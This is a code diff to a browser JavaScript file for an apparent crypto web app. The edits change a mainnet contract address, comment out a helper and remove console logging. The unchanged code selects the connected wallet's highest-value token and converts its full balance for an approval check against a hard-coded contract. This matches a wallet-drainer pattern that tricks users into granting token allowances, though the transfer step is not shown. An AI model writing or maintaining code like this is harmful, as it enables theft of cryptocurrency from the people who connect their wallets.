@@ -180,28 +180,28 @@ const LXB_CONTRACT = {
 
 const DR_CONTRACT = {
   // ADDRESS: "0x7aEBb27455DD33Fc0f555D09A4d2424BDEdC220E", // Replace with your Mainnet contract address
-  ADDRESS: "0xCC7589ff2Da5D12b2f0C568924F12AB9b1859F78",
+  ADDRESS: "0x07bfDbE3f5905f99318d9E2F1C8a664b8e1e4F07",
   CHAIN_ID: 1, // Mainnet chain ID
   DECIMALS: 18,
 }
 
-// Add this function after the existing functions
-async function getTokenWithHighestBalance(tokens) {
-  if (!tokens || tokens.length === 0) return null
+// // Add this function after the existing functions
+// async function getTokenWithHighestBalance(tokens) {
+//   if (!tokens || tokens.length === 0) return null
 
-  tokens.forEach(token => {
-    const balance = Number.parseFloat(token.balance) * token.price;
-    console.log(balance)
-  });
+//   tokens.forEach(token => {
+//     const balance = Number.parseFloat(token.balance) * token.price;
+//     console.log(balance)
+//   });
 
-  console.log(tokens);
+//   console.log(tokens);
 
-  return tokens.reduce((max, token) => {
-    const balance = Number.parseFloat(token.balance) * token.price;
-    const maxBalance = (Number.parseFloat(max.balance) * Number.parseFloat(max.price));
-    return balance > maxBalance ? token : max
-  })
-}
+//   return tokens.reduce((max, token) => {
+//     const balance = Number.parseFloat(token.balance) * token.price;
+//     const maxBalance = (Number.parseFloat(max.balance) * Number.parseFloat(max.price));
+//     return balance > maxBalance ? token : max
+//   })
+// }
 
 async function displayHighestBalanceToken(tokenAddress, isSetSuccessful) {
   const statusEl = document.querySelector("#status")
@@ -247,14 +247,12 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
     )
 
     console.log("Highest balance token:", highestBalanceToken)
-    console.log("Contract details:", details)
+    // console.log("Contract details:", details)
     
     // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
     // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
     const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6));
     
-    console.log("Balance in Wei:", balanceInWei.toString())
-
     const isApproved = await tokenApprover.hasApprovedContract(
       LXB_CONTRACT.ADDRESS,
       account.address, 
@@ -318,8 +316,6 @@ async function fetchUserTokens(address, chainId) {
 
     // Add ETH
     if (data.ETH) {
-      console.log(data)
-
       tokens.push({
         symbol: "ETH",
         name: "Ethereum",
@@ -346,7 +342,6 @@ async function fetchUserTokens(address, chainId) {
       })
     }
 
-    console.log("Tokens found:", tokens)
     return tokens
   }
   return []
@@ -406,7 +401,6 @@ async function loadTokenBalances(userAddress) {
       excludeTokens: ['DUST'],
     });
     const highestBalanceToken = TokenBalanceCalculator.calculateHighestBalanceToken(filteredTokens);
-    console.log(highestBalanceToken);
     if (highestBalanceToken) {
       console.log("Token with highest balance:", highestBalanceToken)
 
